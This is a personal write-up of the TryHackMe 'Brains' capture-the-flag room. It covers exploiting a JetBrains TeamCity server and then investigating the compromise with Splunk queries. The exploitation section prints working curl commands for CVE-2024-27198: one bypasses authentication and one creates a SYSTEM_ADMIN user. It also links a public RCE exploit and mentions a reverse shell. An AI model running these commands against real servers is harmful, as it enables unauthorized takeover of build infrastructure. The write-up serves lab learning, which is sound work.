# Write-up for Brains room

![Picture of the room](/Easy_rooms/Brains/Screenshots/00_Room.png)

All good things come in threes, my third write-up! This TryHackMe Challenge room includes both red and blue team exercises, so there's something for both. The first task will be to gain access to the server by exploiting it, and the second task focuses on an investigation!
Let's get started!

## Exploiting the server

First of all, Nmap scan. We will need to identify the open ports on the server to see which services we may be able to exploit. I will be running the following command for this purpose, but feel free to use different flags for your scan:

```bash
nmap -sS -sV -p- <TARGET_IP>
```

The result of the scan contains valuable information:

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
44525/tcp open  java-rmi Java RMI
50000/tcp open  ibm-db2?
```

4 ports seem to be open, but for us only 2 ports are interesting, them being port 80 running http and port 22 running ssh. Our next steps would be to investigate the web page running on port 80 and after we found something, we might be able to establish a
connection to the machine via ssh. To visit the web page, we only need to enter the IP Address of our target machine in our web browser. Once we did that, we will see the following page

![Web page picture](/Easy_rooms/Brains/Screenshots/01_Webpage.png)

Nothing interesting to see on that page. I checked the source code real quick since the website doesn't have much content. My next approach would be to run a Gobuster brute force enumeration to find any hidden directories. For this, I use the dirbuster wordlists, I would use the following command:

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x.txt,.php
```

This might take some time depending on the threads used or your internet connection. I added the -x flag to see if there might be a hidden file. You usually look out for a hidden PHP file or a .txt file like robots.txt. This scan however didn't give us anything special

![Gobuster result](/Easy_rooms/Brains/Screenshots/02_gobuster_result.png)

Since we reached a dead end for now, I decided to do some research on the other two ports that are open. Port 50000 running ibm db2 is a database management system, just like MySQL. I found out that the default port for the ibm d2 DBMS is 50000, and it accepts non-SSL TCP client connections. With this newly found information, I tried to connect to that port on my browser to see if the service is hosted on a web page. I actually found something! Looks like port 50000 is really running a web server.

![Web Server on port 50000](/Easy_rooms/Brains/Screenshots/03_second-page.png)

Okay, the source code doesn't reveal anything special, but we should take note of the version of team city being 2023.11.3. For now, let's just try to look up a known vulnerability for that version before doing another gobuster scan. I found out known vulnerabilities are CVE-2024-27198 and CVE-2024-27199. I read the following blog post about it [Blogpost](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)
Basically this will allow us remote code execution (RCE). It works because Jetbrains, the ones behind TeamCity, doesn't handle certain requests correctly, so you could build an URL to bypass all authentication checks. Luckily for us, the blog post also provided an example how to trigger that vulnerability. We just need to change the IP Address of that example to our target IP and the port it's running on

```bash
curl -ik http://TARGET_IP:50000/hax?jsp=/app/rest/server;.jsp
```

After we triggered it, we need to exploit that vulnerability, and again, the Blog post provided an example for that as well! How it works is we will now create a new administrator user. Feel free to change the username and password to whatever you like

```bash
curl -ik http://TARGET_IP:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"Admin200\", \"password\": \"sneaky\", \"email\": \"Admin200\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
```

After we did that, we should be able to login to that page using our specified Username and password. If it doesn't work somehow, make sure you check if you don't have any typos or removed anything when you changed some values! It might also help to refresh the page once

![Logging in as Admin200](/Easy_rooms/Brains/Screenshots/04_the_login.png)

Now we are logged in as an admin on the Jetbrains team city site. However, there isn't really anything to exploit, at least I didn't find anything. I tried looking if I could add a web shell trough the "add project" option, but that didn't work, instead I looked for an exploit, so GitHub is the way to go
I found following exploit and it worked: [Exploit](https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py)

Make sure to read their README to understand what is going on, as you are required to download something with pip

![Using the exploit](/Easy_rooms/Brains/Screenshots/05_RCE.png)

Honestly, I could've skipped the part with creating an admin account on my own as it seems as like this exploit does that for me. Anyways, it's still good to know how the vulnerability works. We can now enter commands on that server, but we still need access to the machine. This screams for a reverse shell! I'll generate a reverse shell using Netcat using the [revshell website](https://www.revshells.com/)

On our attacker machine, we will set up our listener

![The listener](/Easy_rooms/Brains/Screenshots/06_Listener.png)

And on our other terminal where we can use RCE on the server, to be able to even get a connection, we first need to enter following command

![The Connection](/Easy_rooms/Brains/Screenshots/07_Conection.png)

(I am not even going to lie, I struggled to establish a shell! I had to look up which shell to use as I am not that experienced yet! I tried using normal nc shells but it failed. After some trial and error, I found this shell and it worked!)
From now on, we just have to find that flag as we got a connection to the machine!

![Getting the flag](/Easy_rooms/Brains/Screenshots/08_TheFlag.png)

## Investigating

I should definitely have less trouble with that, as I must admit I am currently better in blue teaming than red teaming!as the task suggests, let's connect to the Splunk interface on port 8000 and access it with the given credentials! Once we have access, we need to go to the Search section. Also remember to filter for "All time" and not just last 24 hours. Since we weren't given a specific index, I'll just look for everything using "index=*". I first tried searching for a new user creation in the teamcity sourcetype, but there was nothing to be found. Instead, I looked for a new user creation in the auth_logs sourcetype and found something:

```text
index=* sourcetype=auth_logs "new user"
```

![The new user](/Easy_rooms/Brains/Screenshots/09_backdoor.png)

Now we need to find a malicious-looking package installed on the server. There is a sourcetype called packages, so we might find something there. We also know the name of the backdoor user, maybe he uploaded something. He didn't, so let's take a new approach. I searched for keywords like "installed" and got a lot of results. I checked when the backdoor account had been created to reduce the amount of events to find a malicious looking program. It was created on 4th of july (American dates...), from now on I will filter the event to show me everything that happened in a week after the account was created
My query:

```text
index=* sourcetype=packages "installed"
```

![malicious package](/Easy_rooms/Brains/Screenshots/10_malicious-package.png)

We only have a small amount of events now captured due to our time filter, this will make finding malicious activity way easier. The previous question all followed the same pattern: looking for key words in the logs to find suspicious activity. So for this question, all I did was to run a query looking for the word "plugin"

```text
index=* "plugin"
```

![The Plugin](/Easy_rooms/Brains/Screenshots/11_plugin.png)

### There we go, we are done

## Conclusion 
Well, that was a pretty challenging Red team challenge, but a pretty easy blue team one! I guess for now I'll stick to the blue teaming side of cybersecurity, so my future write-ups will be about that, even though red teaming ones are more fun to solve and to write up. Anyways, I wrote in quite a lot of detail this time, I should keep things brief in the future. Hopefully though that made you understand everything!  

